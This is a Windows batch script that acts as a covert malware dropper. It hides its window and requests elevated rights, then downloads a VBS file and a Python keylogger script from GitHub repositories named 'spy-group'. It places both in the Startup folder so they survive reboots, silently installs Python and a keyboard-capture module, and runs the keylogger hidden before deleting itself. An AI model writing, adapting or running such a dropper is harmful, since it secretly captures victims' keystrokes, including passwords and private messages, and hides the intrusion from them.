@echo off
REM Hide the command prompt window and run with elevated privileges
if "%1" == "" (
    mshta vbscript:Execute("CreateObject(""Shell.Application"").ShellExecute ""%~f0"", ""hidden"", """", ""runas"", 1:close")
    exit /b
)

REM --- Part 1: Download and run the VBS file ---
REM Download the VBS file from GitHub
curl -o "%TEMP%\test.vbs" https://raw.githubusercontent.com/spy-group/USB-Data-Backup/main/test.vbs >nul 2>&1

REM Copy the downloaded file to the Startup folder
copy "%TEMP%\test.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\test.vbs" >nul 2>&1

REM Run the VBS file
wscript "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\test.vbs" >nul 2>&1

REM --- Part 2: Install Python, download and run the Python script ---
REM Check if Python is installed
where python >nul 2>&1
if %errorlevel% neq 0 (
    REM Download and install Python silently
    curl -o "%TEMP%\python_installer.exe" https://www.python.org/ftp/python/3.11.5/python-3.11.5-amd64.exe >nul 2>&1
    start /wait "" "%TEMP%\python_installer.exe" /quiet InstallAllUsers=1 PrependPath=1
    del "%TEMP%\python_installer.exe" >nul 2>&1
)

REM Install the 'keyboard' module using pip
python -m pip install keyboard --quiet >nul 2>&1

REM Download the Python script from GitHub
curl -o "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Lecture.pyw" https://raw.githubusercontent.com/spy-group/keylogger/main/Lecture.pyw >nul 2>&1

REM Run the Python script in the background
start "" pythonw "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Lecture.pyw" >nul 2>&1

REM Delete the batch file itself
del "%~f0" >nul 2>&1